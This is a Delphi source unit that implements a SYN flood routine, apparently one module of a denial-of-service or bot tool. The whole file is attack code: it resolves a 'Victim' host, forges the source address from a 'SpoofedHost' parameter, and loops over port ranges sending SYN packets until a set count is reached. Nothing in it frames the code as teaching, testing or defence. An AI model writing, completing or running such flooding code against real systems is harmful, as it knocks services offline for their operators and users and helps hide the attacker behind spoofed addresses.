   unit uSyn;

   interface

   Uses
     Windows,
     u_winsck2,
     u_main,
     u_sockhdr,
     u_sysutils;

   Procedure Syn(Victim, SpoofedHost, DestPort, SrcPort, NumPack, Delay:String);

   implementation

   Procedure Syn(Victim, SpoofedHost, DestPort, SrcPort, NumPack, Delay:String);
   var
     WSAData: TWSAData;
     i, j: integer;
     UseDelay: Boolean;
   begin

     WSAStartup($0101, WSAData);
     FillChar(SynOpt, SizeOf(SynOpt), 0);
     CreateSocket;
     Try
       Randomize;

       SynOpt.HedefAdres.sin_addr.S_addr := Resolve(PChar(Victim));
       SetLength(SynOpt.DstPorts, 1);
       SynOpt.DstPorts[0] := 0;
       SynOpt.HedefAdres.sin_family := AF_INET;
       SynOpt.HedefAdres.sin_port := GetRandomValue(High(Word)) + 1;
       SetLength(SynOpt.SrcPorts, 1);
       SynOpt.SrcPorts[0] := 0;

       SynOpt.SpoofIP := Resolve(PChar(SpoofedHost));
       SynOpt.DstPorts := GetPorts(DestPort);
       SynOpt.SrcPorts := GetPorts(SrcPort);
       If Length(SynOpt.DstPorts) = 0 Then Exit;
       If Length(SynOpt.SrcPorts) = 0 Then Exit;
       SynOpt.Num := StrtoIntDef(NumPack,0);
       SynOpt.Delay := StrtoIntDef(Delay,0);

       UseDelay := SynOpt.Delay > 0;
       Repeat
         For I := 0 To High(SynOpt.DstPorts) Do
         Begin
           For J := 0 To High(SynOpt.SrcPorts) Do
           Begin
             SendSyn(SynOpt.SrcPorts[J], SynOpt.DstPorts[I]);
             If UseDelay Then
               Sleep(SynOpt.Delay);
           End;
         End;
       Until SynOpt.Sended = SynOpt.Num;
     Finally
       CloseSocket(SynOpt.Socket);
       WSACleanUp();
     End;
   End;

   end.
